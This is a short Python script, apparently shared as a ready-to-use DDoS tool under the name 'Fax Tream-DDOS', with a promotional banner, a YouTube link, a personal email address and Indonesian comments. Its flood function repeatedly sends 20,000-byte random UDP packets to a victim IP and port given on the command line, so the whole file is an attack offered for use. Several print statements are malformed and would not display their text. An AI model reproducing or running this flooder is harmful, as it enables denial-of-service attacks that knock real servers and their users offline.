import time
import socket
import random
import sys

ban = ("""
  █████████  ██████████ ███████████
 ███░░░░░███░░███░░░░░█░█░░░███░░░█
░███    ░░░  ░███  █ ░ ░   ░███  ░ 
░░█████████  ░██████       ░███    
 ░░░░░░░░███ ░███░░█       ░███    
 ███    ░███ ░███ ░   █    ░███    
░░█████████  ██████████    █████   
 ░░░░░░░░░  ░░░░░░░░░░    ░░░░░    
 YouTube: https://www.youtube.com/channel/UChIC1-2UU5y6O_ycKVUwbqw
 Credit by: Daxter FD (set)
 ติดต่อตามนี้ไอน้อง Email : nithipoom8@gmail.com
 ติดตามให้ถึง 100 ซับละกันแจก                                                                               
                                                                                
                                                                                
""")
print(ban)


def usage():
    print
    "\033[1;32m############################################################"
    print
    "#-----------------------[\033[1;91mFax Tream-DDOS\033[1;32m]-----------------------#"
    print
    "#----------------------------------------------------------#"
    print
    "#   \033[1;91mCommand: " "Fax Tream " "<ip> <port> <packet> \033[1;32m #"
    print
    "#                                                        ##"
    print
    "#\033[1;91mCreator:Fax Tream \033[1;32m##      #      #                     ##"
    print
    "#\033[1;91mTeam   : Fax Tream      \033[1;32m##     #      #                     ##"
    print
    "#\033[1;91mVersion:Fax Tream       \033[1;32m##      #      #                     ##"
    print
    "#\033[1;91mTQAdmin:Fax Tream  ##"
    print
    "#\033[1;91m       :Fax Tream ##"
    print
    "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
    print
    "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
    print
    "#               \033[1;91m<--[MUSLIM CYBER INDONESIA]-->         \033[1;32m  ##"
    print
    "############################################################"
    print
    "     Member:Fax Tream"
    print
    "           DdosAttack1: Daxter FD"
    print
    "          DdosAttack2:BY : Daxter FD"


def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print
        "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s " % (
        sent, victim, vport)


def main():
    print
    len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()
